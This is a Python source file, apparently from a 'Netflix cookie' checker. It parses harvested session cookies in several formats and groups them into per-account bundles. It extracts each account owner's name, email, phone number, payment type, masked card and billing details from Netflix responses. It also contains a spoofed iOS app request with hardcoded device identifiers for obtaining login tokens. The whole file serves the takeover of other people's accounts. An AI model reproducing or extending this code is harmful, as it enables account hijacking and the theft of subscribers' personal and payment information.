import copy
import html
import json
import os
import re
import unicodedata
from datetime import datetime, timedelta, timezone

import requests
from urllib3.exceptions import InsecureRequestWarning

try:
    import yaml
except ImportError:
    yaml = None

DEFAULT_CONFIG = {
    "txt_fields": {
        "name": True,
        "email": True,
        "max_streams": True,
        "plan_price": True,
        "plan": True,
        "country": True,
        "member_since": True,
        "next_billing": True,
        "extra_members": True,
        "payment_method": True,
        "card": False,
        "phone": True,
        "quality": True,
        "hold_status": True,
        "email_verified": True,
        "membership_status": True,
        "profiles": True,
        "user_guid": True,
    },
    "nftoken": False,
    "retries": {
        "error_proxy_attempts": 3,
        "nftoken_attempts": 1,
    },
    "performance": {
        "request_timeout_seconds": 15,
        "fallback_account_page": False,
        "retry_incomplete_info": False,
        "nftoken_for_free": False,
    },
}

BANNER = """
███╗░░██╗███████╗████████╗███████╗██╗░░░░░██╗██╗░░██╗  ░█████╗░░█████╗░░█████╗░██╗░░██╗██╗███████╗
████╗░██║██╔════╝╚══██╔══╝██╔════╝██║░░░░░██║╚██╗██╔╝  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║██╔════╝
██╔██╗██║█████╗░░░░░██║░░░█████╗░░██║░░░░░██║░╚███╔╝░  ██║░░╚═╝██║░░██║██║░░██║█████═╝░██║█████╗░░
██║╚████║██╔══╝░░░░░██║░░░██╔══╝░░██║░░░░░██║░██╔██╗░  ██║░░██╗██║░░██║██║░░██║██╔═██╗░██║██╔══╝░░
██║░╚███║███████╗░░░██║░░░██║░░░░░███████╗██║██╔╝╚██╗  ╚█████╔╝╚█████╔╝╚█████╔╝██║░╚██╗██║███████╗
╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝╚═╝░░╚═╝  ░╚════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝
"""

APP_VERSION = "4.5.0"

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}

MONTH_ALIASES = {
    "january": 1, "enero": 1, "janvier": 1, "januar": 1, "janeiro": 1, "ocak": 1,
    "styczen": 1, "stycznia": 1, "มกราคม": 1, "يناير": 1, "januari": 1, "gennaio": 1,
    "ianuarie": 1, "jan": 1, "בינואר": 1, "ιανουαριος": 1, "leden": 1, "كانون الثاني": 1,
    "february": 2, "febrero": 2, "fevrier": 2, "fevereiro": 2, "subat": 2,
    "luty": 2, "lutego": 2, "กุมภาพันธ์": 2, "فبراير": 2, "februari": 2, "febbraio": 2,
    "februarie": 2, "feb": 2, "בפברואר": 2, "φεβρουαριος": 2, "únor": 2, "شباط": 2,
    "march": 3, "marzo": 3, "mars": 3, "marco": 3, "marzec": 3, "marca": 3,
    "มีนาคม": 3, "مارس": 3, "maret": 3, "martie": 3, "marz": 3, "maart": 3, "آذار": 3,
    "april": 4, "abril": 4, "avril": 4, "kwiecien": 4, "kwietnia": 4,
    "เมษายน": 4, "أبريل": 4, "aprile": 4, "nisan": 4, "απριλιος": 4, "duben": 4, "نيسان": 4,
    "may": 5, "mayo": 5, "mai": 5, "maj": 5, "maja": 5,
    "พฤษภาคม": 5, "مايو": 5, "mei": 5, "maggio": 5, "mayis": 5, "במאי": 5,
    "μαιος": 5, "květen": 5, "أيار": 5,
    "june": 6, "junio": 6, "juin": 6, "haziran": 6, "czerwiec": 6, "czerwca": 6,
    "มิถุนายน": 6, "يونيو": 6, "juni": 6, "giugno": 6, "ביוני": 6, "junho": 6, "iunie": 6,
    "ιουνιος": 6, "červen": 6, "حزيران": 6,
    "july": 7, "julio": 7, "juillet": 7, "temmuz": 7, "lipiec": 7, "lipca": 7,
    "กรกฎาคม": 7, "يوليو": 7, "juli": 7, "luglio": 7, "ביולי": 7, "julho": 7, "iulie": 7,
    "ιουλιος": 7, "červenec": 7, "تموز": 7,
    "august": 8, "agosto": 8, "août": 8, "agost": 8, "sierpien": 8, "sierpnia": 8,
    "สิงหาคม": 8, "أغسطس": 8, "agustus": 8, "agustos": 8, "באוגוסט": 8,
    "αυγουστος": 8, "srpen": 8, "آب": 8,
    "september": 9, "septiembre": 9, "setembro": 9, "eylul": 9, "wrzesien": 9, "wrzesnia": 9,
    "กันยายน": 9, "سبتمبر": 9, "settembre": 9, "בספטמבר": 9, "septembre": 9,
    "σεπτεμβριος": 9, "září": 9, "أيلول": 9,
    "october": 10, "octubre": 10, "outubro": 10, "ekim": 10, "pazdziernik": 10, "pazdziernika": 10,
    "ตุลาคม": 10, "أكتوبر": 10, "oktober": 10, "ottobre": 10, "באוקטובר": 10, "oktobar": 10,
    "οκτωβριος": 10, "říjen": 10, "تشرين الأول": 10,
    "november": 11, "noviembre": 11, "novembro": 11, "kasim": 11, "listopad": 11, "listopada": 11,
    "พฤศจิกายน": 11, "نوفمبر": 11, "novembre": 11, "בנובמבר": 11, "noiembrie": 11,
    "νοεμβριος": 11, "تشرين الثاني": 11,
    "december": 12, "diciembre": 12, "dezembro": 12, "aralik": 12, "grudzien": 12, "grudnia": 12,
    "ธันวาคม": 12, "ديسمبر": 12, "desember": 12, "dicembre": 12, "december": 12, "בדצמבר": 12,
    "décembre": 12, "δεκεμβριος": 12, "prosinec": 12, "كانون الأول": 12,
}


def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged


def load_config():
    config_yaml_path = "config.yml"
    if os.path.exists(config_yaml_path):
        if yaml is None:
            return copy.deepcopy(DEFAULT_CONFIG)
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config)
        except Exception:
            return copy.deepcopy(DEFAULT_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG)


def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    for _ in range(3):
        previous = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = cleaned.replace("\\\\", "\\")
        if cleaned == previous:
            break
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None


def canonicalize_netflix_cookie_name(name):
    normalized = str(name or "").strip()
    return CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), normalized)


def is_netflix_domain(domain):
    normalized = str(domain or "").strip()
    if normalized.startswith("#HttpOnly_"):
        normalized = normalized[len("#HttpOnly_"):]
    return "netflix." in normalized.lower()


def is_netflix_cookie_entry(domain, name):
    normalized_name = canonicalize_netflix_cookie_name(name)
    return normalized_name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)


def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    for cookie_name in LOGIN_REQUIRED_NETFLIX_COOKIES:
        if not decode_netflix_value(cookie_dict.get(cookie_name)):
            return False
    return True


def split_netscape_cookie_columns(line):
    stripped = line.strip()
    if not stripped:
        return []
    if stripped.startswith("#") and not stripped.startswith("#HttpOnly_"):
        return []
    if stripped.startswith("#HttpOnly_"):
        stripped = stripped[len("#HttpOnly_"):]
    parts = stripped.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", stripped, maxsplit=6)
    if len(parts) >= 7:
        return parts
    return []


def is_netscape_cookie_line(line):
    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
        return False
    return True


def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name, value, position):
    normalized_expires = str(expires or 0).strip()
    if re.fullmatch(r"-?\d+\.\d+", normalized_expires):
        try:
            normalized_expires = str(int(float(normalized_expires)))
        except Exception:
            pass
    return {
        "domain": str(domain or "").replace("#HttpOnly_", "", 1),
        "tail_match": "TRUE" if str(tail_match).upper() == "TRUE" else "FALSE",
        "path": str(path or "/"),
        "secure": "TRUE" if str(secure).upper() == "TRUE" else "FALSE",
        "expires": normalized_expires or "0",
        "name": canonicalize_netflix_cookie_name(name),
        "value": str(value or ""),
        "position": position,
    }


def format_netscape_cookie_entry(entry):
    return (
        f"{entry['domain']}\t{entry['tail_match']}\t{entry['path']}\t{entry['secure']}\t"
        f"{entry['expires']}\t{entry['name']}\t{entry['value']}"
    )


def extract_netscape_cookie_entries(raw_text):
    entries = []
    for index, line in enumerate(raw_text.splitlines()):
        if not is_netscape_cookie_line(line):
            continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7:
            continue
        domain = parts[0]
        name = canonicalize_netflix_cookie_name(parts[5])
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append(build_netscape_cookie_entry(domain, parts[1], parts[2], parts[3], parts[4], name, parts[6], index))
    return entries


def extract_json_cookie_entries(content):
    try:
        json_data = json.loads(content)
    except Exception:
        return []
    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list):
            json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list):
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return []
    entries = []
    for index, cookie in enumerate(json_data):
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append(build_netscape_cookie_entry(
            domain,
            "TRUE" if str(domain).startswith(".") else "FALSE",
            cookie.get("path", "/"),
            "TRUE" if cookie.get("secure", False) else "FALSE",
            cookie.get("expirationDate", cookie.get("expiration", 0)),
            name,
            cookie.get("value", ""),
            index,
        ))
    return entries


def extract_raw_cookie_entries(raw_text):
    pattern = re.compile(
        rf"(?:['\"])?(?P<name>{'|'.join(sorted((re.escape(name) for name in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))})(?:['\"])?"
        r"\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)",
        re.IGNORECASE,
    )
    entries = []
    for index, match in enumerate(pattern.finditer(raw_text)):
        cookie_name = canonicalize_netflix_cookie_name(match.group("name"))
        value = match.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        else:
            value = value.rstrip(",")
        entries.append(build_netscape_cookie_entry(
            ".netflix.com", "TRUE", "/",
            "TRUE" if cookie_name == "SecureNetflixId" else "FALSE",
            "0", cookie_name, value, index
        ))
    return entries


def build_cookie_bundles_from_entries(entries):
    if not entries:
        return []
    entries_by_name = {}
    for entry in entries:
        cookie_name = entry.get("name")
        if not cookie_name:
            continue
        entries_by_name.setdefault(cookie_name, []).append(entry)
    if not entries_by_name:
        return []
    netflix_id_count = len(entries_by_name.get("NetflixId", []))
    bundle_count = netflix_id_count or max(len(name_entries) for name_entries in entries_by_name.values())
    bundles = []
    for bundle_index in range(bundle_count):
        selected_entries = []
        for name_entries in entries_by_name.values():
            if bundle_index < len(name_entries):
                selected_entries.append(name_entries[bundle_index])
            elif len(name_entries) == 1:
                selected_entries.append(name_entries[0])
        if not selected_entries:
            continue
        selected_entries = sorted(selected_entries, key=lambda item: item.get("position", 0))
        netscape_text = "\n".join(format_netscape_cookie_entry(entry) for entry in selected_entries)
        bundles.append({
            "netscape_text": netscape_text,
            "cookies": cookies_dict_from_netscape(netscape_text),
        })
    return bundles


def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = split_netscape_cookie_columns(line)
        if len(parts) >= 7:
            domain = parts[0]
            name = canonicalize_netflix_cookie_name(parts[5])
            value = parts[6]
            if is_netflix_cookie_entry(domain, name):
                cookies[name] = value
    return cookies


def extract_netflix_cookie_bundles(content):
    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
        bundles = build_cookie_bundles_from_entries(extractor(content))
        if bundles:
            return bundles
    return []


def extract_info_from_graphql_payload(response_text):
    try:
        payload = json.loads(response_text)
    except Exception:
        return {}
    if not isinstance(payload, dict):
        return {}
    data = payload.get("data")
    if not isinstance(data, dict):
        return {}
    growth_account = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
    next_plan = ((growth_account.get("nextPlan") or {}).get("plan") or {})
    next_billing = growth_account.get("nextBillingDate") or {}
    hold_meta = growth_account.get("growthHoldMetadata") or {}
    local_phone = growth_account.get("growthLocalizablePhoneNumber") or {}
    raw_phone = local_phone.get("rawPhoneNumber") or {}
    payment_methods = growth_account.get("growthPaymentMethods") or []
    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
    payment_typename = str(payment_method.get("__typename") or "")
    payment_display_text = decode_netflix_value(payment_method.get("displayText"))
    profiles = growth_account.get("profiles") or []
    phone_digits = None
    phone_verified_graphql = None
    phone_country_code = None
    if isinstance(raw_phone, dict):
        phone_digits_obj = raw_phone.get("phoneNumberDigits") or {}
        phone_digits = phone_digits_obj.get("value") if isinstance(phone_digits_obj, dict) else raw_phone.get("phoneNumberDigits")
        phone_verified_graphql = raw_phone.get("isVerified")
        phone_country_code = raw_phone.get("countryCode")
    else:
        phone_digits = raw_phone

    def _growth_email(profile_obj):
        if not isinstance(profile_obj, dict):
            return None, None
        growth_email = profile_obj.get("growthEmail") or {}
        email_obj = growth_email.get("email") or {}
        email_value = email_obj.get("value") if isinstance(email_obj, dict) else None
        return email_value, growth_email.get("isVerified")

    email_value, email_verified = _growth_email(current_profile)
    if not email_value:
        for profile in profiles:
            email_value, email_verified = _growth_email(profile)
            if email_value:
                break

    profile_names = []
    for profile in profiles:
        if isinstance(profile, dict):
            name = decode_netflix_value(profile.get("name"))
            if name and name not in profile_names:
                profile_names.append(name)

    feature_types = []
    for plan_obj in (current_plan, next_plan):
        for feature in (plan_obj.get("availableFeatures") or []):
            if isinstance(feature, dict) and feature.get("type"):
                feature_types.append(str(feature["type"]).upper())

    def _first_boolean_label(*candidates):
        for candidate in candidates:
            labeled = format_boolean_label(candidate)
            if labeled is not None:
                return labeled
        return None

    def _extract_price_value(plan_obj):
        if not isinstance(plan_obj, dict):
            return None
        direct_candidates = [
            plan_obj.get("priceDisplay"), plan_obj.get("displayPrice"),
            plan_obj.get("formattedPrice"), plan_obj.get("formattedPlanPrice"),
            plan_obj.get("planPriceDisplay"),
        ]
        for candidate in direct_candidates:
            decoded = decode_netflix_value(candidate)
            if decoded:
                return decoded
        price_obj = plan_obj.get("price")
        if isinstance(price_obj, dict):
            for key in ("displayValue", "formatted", "formattedPrice", "displayPrice", "value", "amountDisplay"):
                decoded = decode_netflix_value(price_obj.get(key))
                if decoded:
                    return decoded
        return None

    hold_status = _first_boolean_label(
        hold_meta.get("isUserOnHold") if isinstance(hold_meta, dict) else hold_meta,
        hold_meta.get("holdStatus") if isinstance(hold_meta, dict) else None,
        hold_meta.get("isOnHold") if isinstance(hold_meta, dict) else None,
        hold_meta.get("pastDue") if isinstance(hold_meta, dict) else None,
        growth_account.get("isUserOnHold"), growth_account.get("holdStatus"),
        growth_account.get("isOnHold"), growth_account.get("pastDue"), growth_account.get("isPastDue"),
    )

    info = {
        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
        "email": decode_netflix_value(email_value),
        "countryOfSignup": decode_netflix_value(((growth_account.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": decode_netflix_value(growth_account.get("memberSince")),
        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": decode_netflix_value(growth_account.get("ownerGuid") or current_profile.get("guid")),
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No" if feature_types else None,
        "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
        "planPrice": _extract_price_value(current_plan) or _extract_price_value(next_plan),
        "paymentMethodType": decode_netflix_value(payment_method.get("paymentOptionLogo", {}).get("paymentOptionLogo") or growth_account.get("payer")),
        "maskedCard": None,
        "phoneNumber": normalize_phone_number(phone_digits, phone_country_code),
        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
        "holdStatus": hold_status,
        "emailVerified": format_boolean_label(email_verified),
        "phoneVerified": format_boolean_label(phone_verified_graphql),
        "profiles": ", ".join(profile_names) if profile_names else None,
        "maxStreams": decode_netflix_value(current_plan.get("maxStreams")),
    }

    if "Card" in payment_typename:
        info["paymentMethodType"] = "CC"
        if payment_display_text:
            info["maskedCard"] = payment_display_text
    elif payment_display_text and not re.fullmatch(r"\d{4}", payment_display_text):
        info["paymentMethodType"] = info["paymentMethodType"] or payment_display_text

    if not info["paymentMethodType"] and payment_methods:
        if "Card" in payment_typename:
            info["paymentMethodType"] = "CC"

    return {key: value for key, value in info.items() if value not in (None, "", [], {})}


def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            return decode_netflix_value(match.group(1))
    return None


def format_boolean_label(value):
    if isinstance(value, bool):
        return "Yes" if value else "No"
    if isinstance(value, (int, float)) and not isinstance(value, bool):
        return "Yes" if value == 1 else "No" if value == 0 else None
    if isinstance(value, dict):
        for key in ("value", "isUserOnHold", "holdStatus", "isOnHold", "pastDue", "isPastDue", "isVerified", "verified"):
            if key in value:
                parsed = format_boolean_label(value.get(key))
                if parsed is not None:
                    return parsed
        return None
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    lowered = str(cleaned).strip().lower()
    if lowered in {"true", "yes", "1", "on"}:
        return "Yes"
    if lowered in {"false", "no", "0", "off"}:
        return "No"
    return None


def extract_bool_value(response_text, patterns):
    value = extract_first_match(response_text, patterns, re.IGNORECASE)
    if value is None:
        return None
    parsed = format_boolean_label(value)
    return parsed if parsed is not None else value


def extract_profile_names(response_text):
    names = []
    for pattern in [
        r'"profileName"\s*:\s*"([^"]+)"',
        r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
    ]:
        for found in re.findall(pattern, response_text, re.DOTALL):
            decoded = decode_netflix_value(found)
            if decoded and decoded not in names:
                names.append(decoded)
    return ", ".join(names) if names else None


def has_complete_account_info(info):
    if not info:
        return False
    required_fields = ("countryOfSignup", "membershipStatus", "localizedPlanName", "maxStreams", "videoQuality")
    return all(info.get(field) and info.get(field) != "null" for field in required_fields)


def merge_info(primary, fallback):
    merged = dict(fallback or {})
    for key, value in (primary or {}).items():
        if value not in (None, "", [], {}):
            merged[key] = value
    return merged


def extract_info(response_text):
    graphql_info = extract_info_from_graphql_payload(response_text)
    extra_member_account_patterns = (
        r"assinante\s+extra\s+no\s+plano\s+de\s+outra\s+pessoa",
        r"suscriptor\s+extra\s+en\s+el\s+plan\s+de\s+otra\s+persona",
        r"extra\s+on\s+someone.?else.?s\s+plan",
        r"abbonato\s+extra\s+sul\s+piano\s+di\s+un.?altra\s+persona",
        r"abonn[ée]\s+suppl[ée]mentaire\s+sur\s+le\s+forfait\s+de\s+quelqu.?un\s+d.?autre",
        r"ekstra\s+uye\s+bir\s+baskasinin\s+planinda",
    )
    extra_member_by_response_text = any(
        re.search(pattern, response_text, re.IGNORECASE)
        for pattern in extra_member_account_patterns
    )
    if has_complete_account_info(graphql_info):
        extracted = dict(graphql_info)
    else:
        extracted = {
            "accountOwnerName": extract_first_match(response_text, [
                r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"',
                r'"accountOwnerName"\s*:\s*"([^"]+)"',
                r'"firstName"\s*:\s*"([^"]+)"',
            ]),
            "email": extract_first_match(response_text, [
                r'"emailAddress"\s*:\s*"([^"]+)"',
                r'"email"\s*:\s*"([^"]+)"',
                r'"loginId"\s*:\s*"([^"]+)"',
            ]),
            "countryOfSignup": extract_first_match(response_text, [
                r'"currentCountry"\s*:\s*"([^"]+)"',
                r'"countryOfSignup":\s*"([^"]+)"',
            ]),
            "memberSince": extract_first_match(response_text, [r'"memberSince":\s*"([^"]+)"']),
            "nextBillingDate": extract_first_match(response_text, [
                r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T',
                r'"nextBillingDate"\s*:\s*"([^"]+)"',
            ]),
            "userGuid": extract_first_match(response_text, [r'"userGuid":\s*"([^"]+)"']),
            "showExtraMemberSection": extract_bool_value(response_text, [
                r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
                r'"showExtraMemberSection"\s*:\s*(true|false)',
            ]),
            "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
            "maxStreams": extract_first_match(response_text, [
                r'"maxStreams"\s*:\s*"?([^",}]+)"?',
            ]),
            "localizedPlanName": extract_first_match(response_text, [
                r'"localizedPlanName"\s*:\s*"([^"]+)"',
                r'"planName"\s*:\s*"([^"]+)"',
                r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
                r'"nextPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
            ]),
            "planPrice": extract_first_match(response_text, [
                r'"formattedPlanPrice"\s*:\s*"([^"]+)"',
                r'"formattedPrice"\s*:\s*"([^"]+)"',
                r'"planPrice"\s*:\s*"([^"]+)"',
                r'"displayPrice"\s*:\s*"([^"]+)"',
            ]),
            "paymentMethodExists": extract_bool_value(response_text, [
                r'"paymentMethodExists":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
                r'"paymentMethodExists"\s*:\s*(true|false)',
            ]),
            "paymentMethodType": extract_first_match(response_text, [
                r'"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                r'"paymentMethod"\s*:\s*"([^"]+)"',
                r'"paymentMethodType"\s*:\s*"([^"]+)"',
            ]),
            "maskedCard": extract_first_match(response_text, [
                r'"displayText"\s*:\s*"([^"]+)"',
                r'"paymentCardDisplayString"\s*:\s*"([^"]+)"',
                r'"paymentMethodLast4"\s*:\s*"([^"]+)"',
                r'"maskedCard"\s*:\s*"([^"]+)"',
            ]),
            "phoneNumber": extract_first_match(response_text, [
                r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
                r'"phoneNumber"\s*:\s*"([^"]+)"',
            ]),
            "phoneVerified": extract_bool_value(response_text, [
                r'"phoneVerified"\s*:\s*(true|false)',
                r'"isPhoneVerified"\s*:\s*(true|false)',
            ]),
            "videoQuality": extract_first_match(response_text, [
                r'"videoQuality"\s*:\s*"([^"]+)"',
                r'"quality"\s*:\s*"([^"]+)"',
            ]),
            "holdStatus": extract_bool_value(response_text, [
                r'"holdStatus"\s*:\s*(true|false)',
                r'"isUserOnHold"\s*:\s*(true|false)',
                r'"isOnHold"\s*:\s*(true|false)',
                r'"pastDue"\s*:\s*(true|false)',
                r'"isPastDue"\s*:\s*(true|false)',
            ]),
            "emailVerified": extract_bool_value(response_text, [
                r'"emailVerified"\s*:\s*(true|false)',
                r'"isEmailVerified"\s*:\s*(true|false)',
                r'"contactEmailVerified"\s*:\s*(true|false)',
            ]),
            "profiles": extract_profile_names(response_text),
        }
        extracted = merge_info(graphql_info, extracted)

    extracted.setdefault("paymentMethodType", None)
    extracted.setdefault("paymentMethodExists", None)
    extracted.setdefault("maskedCard", None)
    extracted.setdefault("holdStatus", None)
    extracted.setdefault("emailVerified", None)
    extracted.setdefault("phoneNumber", None)
    extracted.setdefault("countryOfSignup", None)
    extracted.setdefault("membershipStatus", None)
    extracted.setdefault("localizedPlanName", None)

    if extra_member_by_response_text:
        extracted["isExtraMemberAccount"] = "Yes"

    if extracted["localizedPlanName"]:
        extracted["localizedPlanName"] = extracted["localizedPlanName"].replace("miembro u00A0extra", "(Extra Member)")

    if not extracted["paymentMethodType"]:
        extracted["paymentMethodType"] = extracted["paymentMethodExists"]

    if extracted["maskedCard"] and re.fullmatch(r"\d{4}", extracted["maskedCard"]):
        if extracted.get("paymentMethodType") in {None, "", "Yes"}:
            extracted["paymentMethodType"] = "CC"

    if extracted["holdStatus"] is None:
        membership_status_key = normalize_plan_key(extracted.get("membershipStatus"))
        if membership_status_key == "current_member":
            extracted["holdStatus"] = "No"
        elif any(token in membership_status_key for token in ("hold", "past_due", "payment_retry", "paused", "suspend")):
            extracted["holdStatus"] = "Yes"

    if extracted["emailVerified"] is None and extracted.get("email"):
        extracted["emailVerified"] = "Yes"

    phone_number = extracted.get("phoneNumber")
    extracted["phoneDisplay"] = normalize_phone_number(phone_number, extracted.get("countryOfSignup"))

    profiles = extracted.get("profiles")
    if profiles:
        profile_count = len([name for name in profiles.split(", ") if name])
        extracted["profileCount"] = profile_count
        extracted["profilesDisplay"] = profiles
    else:
        extracted["profileCount"] = None
        extracted["profilesDisplay"] = None

    return extracted


def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    simplified = unicodedata.normalize("NFKD", plan_name)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
    return normalized or "unknown"


def _int_or_none(value):
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    try:
        return int(str(cleaned).strip())
    except Exception:
        match = re.search(r"\d+", str(cleaned))
        if match:
            try:
                return int(match.group(0))
            except Exception:
                return None
        return None

